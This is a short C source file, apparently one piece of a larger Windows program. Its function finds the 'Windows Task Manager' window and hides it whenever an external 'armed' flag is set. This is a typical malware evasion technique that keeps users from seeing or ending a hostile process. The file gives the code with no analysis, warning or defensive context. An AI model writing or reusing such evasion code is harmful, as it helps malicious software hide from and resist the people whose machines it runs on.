#include "system.h"

extern bool armed;

void close_task_manager() {
	HWND hWnd = FindWindow(NULL, "Windows Task Manager");
	if (hWnd != NULL && armed) {
		ShowWindow(hWnd, SW_HIDE);
	}
}